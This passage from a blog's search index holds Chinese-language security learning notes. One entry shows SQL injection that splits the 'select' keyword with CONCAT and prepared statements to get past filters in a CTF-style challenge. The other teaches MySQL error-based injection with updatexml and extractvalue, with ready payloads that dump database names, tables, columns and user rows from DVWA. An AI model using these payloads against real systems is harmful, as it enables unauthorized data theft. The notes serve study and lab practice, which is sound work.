‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>预编译拼接字符法</title>
      <link href="/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/"/>
      <url>/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="预编译拼接字符法"><a href="#预编译拼接字符法" class="headerlink" title="预编译拼接字符法"></a>预编译拼接字符法</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>直接concat函数来进行一个拼接字符串的方法<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;  // 结束前面的查询语句</span><br><span class="line"></span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);  </span><br><span class="line">//将关键字拆分（比如select拆成&#x27;sele&#x27;+&#x27;ct&#x27;）来绕过简单的关键字过滤</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;  // 准备预处理语句</span><br><span class="line">EXECUTE stmt;  // 执行预处理语句</span><br><span class="line">#</span><br><span class="line">//注释掉原查询剩余部分</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/90960">https://xz.aliyun.com/news/90960</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL报错注入</title>
      <link href="/blog/2026/01/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/blog/2026/01/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h1><p>标签（空格分隔）： SQL</p><hr><p>–首先引入两个函数</p><p>##updatexml（）函数</p><h2 id="函数语法-函数原理：updatexml使用时，当xpath-string格式出现错误，mysql则会爆出xpath语法错误（xpath-syntax）注入流程"><a href="#函数语法-函数原理：updatexml使用时，当xpath-string格式出现错误，mysql则会爆出xpath语法错误（xpath-syntax）注入流程" class="headerlink" title="函数语法:函数原理：updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）注入流程:"></a><code>函数语法:</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><br><code>函数原理：</code><br>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</span><br></pre></td></tr></table></figure><br><code>注入流程:</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆数据库表相关信息：</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#</span><br><span class="line"></span><br><span class="line">爆当前数据库表信息：</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆user表字段信息</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆数据库内容</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</span><br></pre></td></tr></table></figure></h2><p>##extractvalue（）函数<br><code>函数语法:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure><p><code>函数原理:</code></p><p>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select user,password from users where user_id=1 and (extractvalue(1,0x7e));</span><br><span class="line"></span><br><span class="line">由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</span><br></pre></td></tr></table></figure><p><code>注入流程:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆库表信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</span><br><span class="line"></span><br><span class="line">爆当前数据库信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</span><br><span class="line"></span><br><span class="line">爆当前表行信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) #</span><br><span class="line"></span><br><span class="line">抓字段</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
